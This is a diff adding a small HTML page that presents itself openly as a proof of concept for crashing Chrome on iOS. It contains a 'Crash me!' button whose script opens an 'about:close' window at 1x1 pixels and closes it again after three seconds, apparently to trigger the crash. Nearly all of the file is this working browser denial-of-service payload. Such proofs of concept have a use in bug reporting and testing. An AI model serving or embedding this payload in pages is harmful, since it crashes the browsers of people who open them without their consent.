@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<p>Click button to crash chrome in iOS.</p>
+
+<button onclick="myFunction()">Crash me!</button>
+
+<script>
+function myFunction() {
+    var win = window.open('about:close','windowname12','width=1,height=1,left=5,top=3');
+    setTimeout(function() { win.close();}, 3000);
+}
+</script>
+
+</body>
+</html>
